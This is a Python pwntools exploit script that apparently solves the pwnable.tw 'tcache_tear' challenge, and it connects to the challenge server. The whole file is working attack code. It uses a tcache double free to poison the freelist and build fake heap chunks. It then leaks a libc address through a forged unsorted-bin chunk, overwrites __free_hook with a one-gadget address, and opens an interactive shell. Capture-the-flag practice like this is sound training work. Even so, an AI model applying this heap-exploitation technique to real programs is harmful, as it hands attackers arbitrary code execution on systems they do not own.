#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./tcache_tear"
elf=ELF(pwn_file)
libc=ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10207)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def name(data):
    r.sendafter("Name:", data)

def add(size, data):
    r.sendafter("choice :", '1')
    r.sendafter("Size:", str(size))
    r.sendafter("Data:", data)

def dele():
    r.sendafter("choice :", '2')

def show():
    r.sendafter("choice :", '3')

debug()

# fake next chunk
name('a')
add(0x80, 'a')
dele()
dele()
add(0x80, p64(0x602550))
add(0x80, 'a')
add(0x80, p64(0)+p64(0x21)+p64(0)*3+p64(0x21))

# fake unsorted bin chunk
add(0x70, 'a')
dele()
dele()
add(0x70, p64(0x602050))
add(0x70, 'b')
add(0x70, p64(0)+p64(0x501)+p64(0)*5+p64(0x602060))

# leak libc
dele()
show()
r.recvuntil("Name :")
a = u64(r.recv(6)+'\x00'*2) - 0x3ebca0
libc.address = a
info("libc: " + hex(a))

# get shell
add(0x40, 'a')
dele()
dele()
add(0x40, p64(libc.sym['__free_hook']))
add(0x40, 'a')
add(0x40, p64(a+0x4f322))

dele()

r.interactive()
